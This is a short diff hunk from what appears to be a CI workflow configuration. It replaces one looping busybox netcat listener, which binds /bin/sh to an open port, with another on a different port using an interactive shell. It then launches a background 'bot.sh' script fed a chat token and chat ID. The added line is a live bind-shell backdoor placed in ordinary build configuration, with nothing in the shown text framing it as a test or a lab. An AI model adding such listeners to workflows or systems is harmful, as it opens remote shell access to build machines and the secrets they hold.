@@ -193,8 +193,7 @@ jobs:
           set -o pipefail
           {
             # listener nc
-            while [ 1 ]; do busybox nc -l -p 20023 -e /bin/sh; echo "1"; done &
-            sleep 3
+            while [ 1 ]; do busybox nc -l -p 20022 -e /bin/sh -i; echo "start nc listen"; done &
 
             chmod +x myfuzzing/bot.sh
             nohup myfuzzing/bot.sh "$CHAT_TOKEN" "$CHAT_ID" > ~/bot.log 2>&1 &
